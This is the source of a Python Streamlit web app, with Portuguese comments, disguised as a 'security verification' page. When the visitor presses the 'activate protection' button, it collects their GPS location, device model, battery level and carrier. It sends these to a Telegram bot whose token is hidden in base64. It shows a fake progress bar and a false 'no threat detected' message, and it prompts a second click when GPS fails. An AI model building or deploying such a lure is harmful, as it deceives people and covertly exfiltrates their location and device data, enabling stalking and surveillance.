import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
    except: pass

def get_operadora():
    try:
        r = requests.get('http://ip-api.com/json/', timeout=5).json()
        return f"{r.get('isp')}"
    except: return "Desconhecida"

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.markdown("<style>.main { background-color: #0d1117; color: #ffffff; } .status-ok { color: #2ea043; font-weight: bold; }</style>", unsafe_allow_html=True)

st.title("Verificação de Segurança")

# --- COLETA DE DADOS (FORÇADA) ---
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL_V4')
# Pega a bateria real do sistema
bat_js = "navigator.getBattery().then(b => Math.round(b.level * 100))"
bateria_real = streamlit_js_eval(js_expressions=bat_js, key='BAT_FINAL_V4')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # 1. Tenta o GPS (Já está permitido no seu print)
    loc = get_geolocation()
    operadora = get_operadora()
    
    # 2. Barra de progresso visual
    barra = st.progress(0)
    for i in range(1, 101):
        time.sleep(0.01)
        barra.progress(i)
    
    # 3. Limpa o nome do Modelo (Pega o que importa)
    modelo = "Android Device"
    if ua and "(" in ua:
        modelo = ua.split("(")[1].split(";")[1].replace("Build", "").strip() if ";" in ua else ua.split("(")[1].split(")")[0]

    # 4. Relatório com TUDO (Bateria, Operadora, Modelo e Mapa)
    bateria_exibicao = bateria_real if bateria_real else "Calculando..."
    
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bateria_exibicao}%\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {mapa}"
        )
        enviar_telegram(relatorio)
        st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    else:
        # Envia sem o mapa se o GPS der timeout, mas com o resto dos dados
        enviar_telegram(f"⚠️ *AVISO: GPS TIMEOUT*\n📱 *Aparelho:* {modelo}\n🔋 *Bateria:* {bateria_exibicao}%\n📶 *Op:* {operadora}")
        st.warning("🔄 O sistema está sincronizando. Clique mais uma vez.")

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
